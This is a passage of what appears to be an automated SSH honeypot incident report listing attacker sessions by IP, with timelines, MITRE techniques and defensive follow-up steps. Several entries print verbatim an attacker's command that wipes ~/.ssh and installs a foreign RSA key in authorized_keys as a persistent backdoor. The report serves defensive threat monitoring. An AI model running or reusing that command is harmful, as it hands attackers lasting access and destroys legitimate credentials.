| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:11:35` | `cowrie.session.connect` |
| `2026-06-11 19:11:35` | `cowrie.client.version` |
| `2026-06-11 19:11:35` | `cowrie.client.kex` |
| `2026-06-11 19:11:36` | `cowrie.login.success` |
| `2026-06-11 19:11:37` | `cowrie.session.params` |
| `2026-06-11 19:11:37` | `cowrie.command.input` |
| `2026-06-11 19:11:37` | `cowrie.command.failed` |
| `2026-06-11 19:11:37` | `cowrie.log.closed` |
| `2026-06-11 19:11:37` | `cowrie.session.params` |
| `2026-06-11 19:11:37` | `cowrie.command.input` |
| `2026-06-11 19:11:37` | `cowrie.session.file_download` |
| `2026-06-11 19:11:37` | `cowrie.log.closed` |
| `2026-06-11 19:11:50` | `cowrie.session.params` |
| `2026-06-11 19:11:50` | `cowrie.command.input` |
| `2026-06-11 19:11:51` | `cowrie.log.closed` |
| `2026-06-11 19:11:51` | `cowrie.session.params` |
| `2026-06-11 19:11:51` | `cowrie.command.input` |
| `2026-06-11 19:11:52` | `cowrie.log.closed` |
| `2026-06-11 19:11:52` | `cowrie.session.params` |
| `2026-06-11 19:11:52` | `cowrie.command.input` |
| `2026-06-11 19:11:52` | `cowrie.session.file_download` |
| `2026-06-11 19:11:52` | `cowrie.log.closed` |
| `2026-06-11 19:11:53` | `cowrie.session.params` |
| `2026-06-11 19:11:53` | `cowrie.command.input` |
| `2026-06-11 19:11:53` | `cowrie.log.closed` |
| `2026-06-11 19:11:54` | `cowrie.session.params` |
| `2026-06-11 19:11:54` | `cowrie.command.input` |
| `2026-06-11 19:11:54` | `cowrie.log.closed` |
| `2026-06-11 19:11:54` | `cowrie.session.params` |
| `2026-06-11 19:11:54` | `cowrie.command.input` |
| `2026-06-11 19:11:54` | `cowrie.command.input` |
| `2026-06-11 19:11:55` | `cowrie.log.closed` |
| `2026-06-11 19:11:55` | `cowrie.session.params` |
| `2026-06-11 19:11:55` | `cowrie.command.input` |
| `2026-06-11 19:11:55` | `cowrie.log.closed` |
| `2026-06-11 19:11:55` | `cowrie.session.params` |
| `2026-06-11 19:11:55` | `cowrie.command.input` |
| `2026-06-11 19:11:56` | `cowrie.log.closed` |
| `2026-06-11 19:11:56` | `cowrie.session.params` |
| `2026-06-11 19:11:56` | `cowrie.command.input` |
| `2026-06-11 19:11:56` | `cowrie.log.closed` |
| `2026-06-11 19:11:56` | `cowrie.session.params` |
| `2026-06-11 19:11:56` | `cowrie.command.input` |
| `2026-06-11 19:11:57` | `cowrie.log.closed` |
| `2026-06-11 19:11:57` | `cowrie.session.params` |
| `2026-06-11 19:11:57` | `cowrie.command.input` |
| `2026-06-11 19:11:57` | `cowrie.log.closed` |
| `2026-06-11 19:11:57` | `cowrie.session.params` |
| `2026-06-11 19:11:57` | `cowrie.command.input` |
| `2026-06-11 19:11:57` | `cowrie.log.closed` |
| `2026-06-11 19:11:58` | `cowrie.session.params` |
| `2026-06-11 19:11:58` | `cowrie.command.input` |
| `2026-06-11 19:11:58` | `cowrie.log.closed` |
| `2026-06-11 19:11:58` | `cowrie.session.params` |
| `2026-06-11 19:11:58` | `cowrie.command.input` |
| `2026-06-11 19:11:58` | `cowrie.log.closed` |
| `2026-06-11 19:11:59` | `cowrie.session.params` |
| `2026-06-11 19:11:59` | `cowrie.command.input` |
| `2026-06-11 19:11:59` | `cowrie.log.closed` |
| `2026-06-11 19:11:59` | `cowrie.session.params` |
| `2026-06-11 19:11:59` | `cowrie.command.input` |
| `2026-06-11 19:11:59` | `cowrie.log.closed` |
| `2026-06-11 19:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.159[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.96.159[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947a07621038

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:12 |
| **Last Seen** | 2026-06-11 19:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:12:44` | `cowrie.session.connect` |
| `2026-06-11 19:12:44` | `cowrie.client.version` |
| `2026-06-11 19:12:44` | `cowrie.client.kex` |
| `2026-06-11 19:12:45` | `cowrie.login.success` |
| `2026-06-11 19:12:46` | `cowrie.session.params` |
| `2026-06-11 19:12:46` | `cowrie.command.input` |
| `2026-06-11 19:12:46` | `cowrie.command.failed` |
| `2026-06-11 19:12:46` | `cowrie.log.closed` |
| `2026-06-11 19:12:47` | `cowrie.session.params` |
| `2026-06-11 19:12:47` | `cowrie.command.input` |
| `2026-06-11 19:12:47` | `cowrie.session.file_download` |
| `2026-06-11 19:12:47` | `cowrie.log.closed` |
| `2026-06-11 19:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c664f90a05dd

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:12 |
| **Last Seen** | 2026-06-11 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:12:50` | `cowrie.session.connect` |
| `2026-06-11 19:12:50` | `cowrie.client.version` |
| `2026-06-11 19:12:50` | `cowrie.client.kex` |
| `2026-06-11 19:12:51` | `cowrie.login.success` |
| `2026-06-11 19:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6adb8f858b

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:14 |
| **Last Seen** | 2026-06-11 19:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:14:43` | `cowrie.session.connect` |
| `2026-06-11 19:14:43` | `cowrie.client.version` |
| `2026-06-11 19:14:44` | `cowrie.client.kex` |
| `2026-06-11 19:14:45` | `cowrie.login.success` |
| `2026-06-11 19:14:45` | `cowrie.session.params` |
| `2026-06-11 19:14:45` | `cowrie.command.input` |
| `2026-06-11 19:14:45` | `cowrie.command.failed` |
| `2026-06-11 19:14:46` | `cowrie.log.closed` |
| `2026-06-11 19:14:46` | `cowrie.session.params` |
| `2026-06-11 19:14:46` | `cowrie.command.input` |
| `2026-06-11 19:14:46` | `cowrie.session.file_download` |
| `2026-06-11 19:14:46` | `cowrie.log.closed` |
| `2026-06-11 19:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56906b63d462

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:14 |
| **Last Seen** | 2026-06-11 19:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:14:49` | `cowrie.session.connect` |
| `2026-06-11 19:14:49` | `cowrie.client.version` |
| `2026-06-11 19:14:49` | `cowrie.client.kex` |
| `2026-06-11 19:14:50` | `cowrie.login.success` |
| `2026-06-11 19:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c205b39e763

| Field | Detail |
|---|---|
| **Source IP** | `190.223.60[.]209` |
| **First Seen** | 2026-06-11 19:15 |
| **Last Seen** | 2026-06-11 19:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:15:34` | `cowrie.session.connect` |
| `2026-06-11 19:15:34` | `cowrie.client.version` |
| `2026-06-11 19:15:34` | `cowrie.client.kex` |
| `2026-06-11 19:15:35` | `cowrie.login.success` |
| `2026-06-11 19:15:36` | `cowrie.session.params` |
| `2026-06-11 19:15:36` | `cowrie.command.input` |
| `2026-06-11 19:15:36` | `cowrie.command.failed` |
| `2026-06-11 19:15:37` | `cowrie.log.closed` |
| `2026-06-11 19:15:37` | `cowrie.session.params` |
| `2026-06-11 19:15:37` | `cowrie.command.input` |
| `2026-06-11 19:15:38` | `cowrie.session.file_download` |
| `2026-06-11 19:15:38` | `cowrie.log.closed` |
| `2026-06-11 19:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.60[.]209` to AbuseIPDB if not already reported
- [ ] Block `190.223.60[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-611c269f6c6a

| Field | Detail |
|---|---|
| **Source IP** | `190.223.60[.]209` |
| **First Seen** | 2026-06-11 19:15 |
| **Last Seen** | 2026-06-11 19:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:15:42` | `cowrie.session.connect` |
| `2026-06-11 19:15:42` | `cowrie.client.version` |
| `2026-06-11 19:15:42` | `cowrie.client.kex` |
| `2026-06-11 19:15:44` | `cowrie.login.success` |
| `2026-06-11 19:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.60[.]209` to AbuseIPDB if not already reported
- [ ] Block `190.223.60[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0851913a7ef9

| Field | Detail |
|---|---|
| **Source IP** | `14.29.170[.]54` |
| **First Seen** | 2026-06-11 19:22 |
| **Last Seen** | 2026-06-11 19:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:22:21` | `cowrie.session.connect` |
| `2026-06-11 19:22:21` | `cowrie.client.version` |
| `2026-06-11 19:22:21` | `cowrie.client.kex` |
| `2026-06-11 19:22:21` | `cowrie.login.success` |
| `2026-06-11 19:22:22` | `cowrie.session.params` |
| `2026-06-11 19:22:22` | `cowrie.command.input` |
| `2026-06-11 19:22:22` | `cowrie.command.failed` |
| `2026-06-11 19:22:22` | `cowrie.log.closed` |
| `2026-06-11 19:22:22` | `cowrie.session.params` |
| `2026-06-11 19:22:22` | `cowrie.command.input` |
| `2026-06-11 19:22:22` | `cowrie.session.file_download` |
| `2026-06-11 19:22:22` | `cowrie.log.closed` |
| `2026-06-11 19:22:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.170[.]54` to AbuseIPDB if not already reported
- [ ] Block `14.29.170[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4acb9aed79ef

| Field | Detail |
|---|---|
| **Source IP** | `14.29.170[.]54` |
| **First Seen** | 2026-06-11 19:22 |
| **Last Seen** | 2026-06-11 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:22:24` | `cowrie.session.connect` |
| `2026-06-11 19:22:24` | `cowrie.client.version` |
| `2026-06-11 19:22:24` | `cowrie.client.kex` |
| `2026-06-11 19:22:25` | `cowrie.login.success` |
| `2026-06-11 19:22:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.170[.]54` to AbuseIPDB if not already reported
- [ ] Block `14.29.170[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a316ea494c31

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:22 |
| **Last Seen** | 2026-06-11 19:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:22:27` | `cowrie.session.connect` |
| `2026-06-11 19:22:27` | `cowrie.client.version` |
| `2026-06-11 19:22:27` | `cowrie.client.kex` |
| `2026-06-11 19:22:28` | `cowrie.login.success` |
| `2026-06-11 19:22:29` | `cowrie.session.params` |
| `2026-06-11 19:22:29` | `cowrie.command.input` |
| `2026-06-11 19:22:29` | `cowrie.command.failed` |
| `2026-06-11 19:22:29` | `cowrie.log.closed` |
| `2026-06-11 19:22:30` | `cowrie.session.params` |
| `2026-06-11 19:22:30` | `cowrie.command.input` |
| `2026-06-11 19:22:30` | `cowrie.session.file_download` |
| `2026-06-11 19:22:30` | `cowrie.log.closed` |
| `2026-06-11 19:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ad82687326

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:22 |
| **Last Seen** | 2026-06-11 19:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:22:33` | `cowrie.session.connect` |
| `2026-06-11 19:22:33` | `cowrie.client.version` |
| `2026-06-11 19:22:33` | `cowrie.client.kex` |
| `2026-06-11 19:22:34` | `cowrie.login.success` |
| `2026-06-11 19:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0082b2424584

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:24 |
| **Last Seen** | 2026-06-11 19:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:24:28` | `cowrie.session.connect` |
| `2026-06-11 19:24:28` | `cowrie.client.version` |
| `2026-06-11 19:24:28` | `cowrie.client.kex` |
| `2026-06-11 19:24:29` | `cowrie.login.success` |
| `2026-06-11 19:24:30` | `cowrie.session.params` |
| `2026-06-11 19:24:30` | `cowrie.command.input` |
| `2026-06-11 19:24:30` | `cowrie.command.failed` |
| `2026-06-11 19:24:30` | `cowrie.log.closed` |
| `2026-06-11 19:24:30` | `cowrie.session.params` |
| `2026-06-11 19:24:30` | `cowrie.command.input` |
| `2026-06-11 19:24:31` | `cowrie.session.file_download` |
| `2026-06-11 19:24:31` | `cowrie.log.closed` |
| `2026-06-11 19:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-460e3b77da10

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:24 |
| **Last Seen** | 2026-06-11 19:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:24:34` | `cowrie.session.connect` |
| `2026-06-11 19:24:34` | `cowrie.client.version` |
| `2026-06-11 19:24:34` | `cowrie.client.kex` |
| `2026-06-11 19:24:35` | `cowrie.login.success` |
| `2026-06-11 19:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d444506e8a41

| Field | Detail |
|---|---|
| **Source IP** | `154.146.238[.]122` |
| **First Seen** | 2026-06-11 19:37 |
| **Last Seen** | 2026-06-11 19:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:37:16` | `cowrie.session.connect` |
| `2026-06-11 19:37:17` | `cowrie.client.version` |
| `2026-06-11 19:37:17` | `cowrie.client.kex` |
| `2026-06-11 19:37:18` | `cowrie.login.success` |
| `2026-06-11 19:37:18` | `cowrie.direct-tcpip.request` |
| `2026-06-11 19:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.146.238[.]122` to AbuseIPDB if not already reported
- [ ] Block `154.146.238[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c186965c797

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:39 |
| **Last Seen** | 2026-06-11 19:39 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:39:17` | `cowrie.session.connect` |
| `2026-06-11 19:39:17` | `cowrie.client.version` |
| `2026-06-11 19:39:17` | `cowrie.client.kex` |
| `2026-06-11 19:39:20` | `cowrie.login.success` |
| `2026-06-11 19:39:23` | `cowrie.session.params` |
| `2026-06-11 19:39:23` | `cowrie.command.input` |
| `2026-06-11 19:39:23` | `cowrie.command.failed` |
| `2026-06-11 19:39:23` | `cowrie.log.closed` |
| `2026-06-11 19:39:23` | `cowrie.session.params` |
| `2026-06-11 19:39:23` | `cowrie.command.input` |
| `2026-06-11 19:39:24` | `cowrie.session.file_download` |
| `2026-06-11 19:39:24` | `cowrie.log.closed` |
| `2026-06-11 19:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f6c3cea644

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:39 |
| **Last Seen** | 2026-06-11 19:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:39:33` | `cowrie.session.connect` |
| `2026-06-11 19:39:33` | `cowrie.client.version` |
| `2026-06-11 19:39:34` | `cowrie.client.kex` |
| `2026-06-11 19:39:35` | `cowrie.login.success` |
| `2026-06-11 19:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

